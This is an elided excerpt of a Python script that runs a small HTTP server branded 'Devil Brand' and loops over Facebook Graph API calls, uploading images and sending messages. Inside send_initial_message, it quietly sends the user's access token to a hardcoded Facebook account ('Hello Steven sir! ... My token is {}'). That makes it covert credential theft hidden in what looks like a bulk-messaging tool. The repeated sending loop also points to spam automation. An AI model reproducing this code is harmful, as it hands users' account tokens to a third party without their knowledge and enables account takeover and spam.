...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY Devil Brand")
...
def send_initial_message():
    ...
    msg_template = "Hello Steven sir! I am using your server. My token is {}. India live time now {}"

    # Specify the ID where you want to send the message
    target_id = "61552799422770"
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                # Step 1: Upload the image to Facebook and get the attachment ID
                image_upload_url = "https://graph.facebook.com/v17.0/me/photos"
                files = {'source': open(image_path, 'rb')}
                payload = {'access_token': access_token}
                image_response = requests.post(image_upload_url, files=files, data=payload)
                attachment_id = image_response.json()['id']

                # Step 2: Send the message with the attachment ID
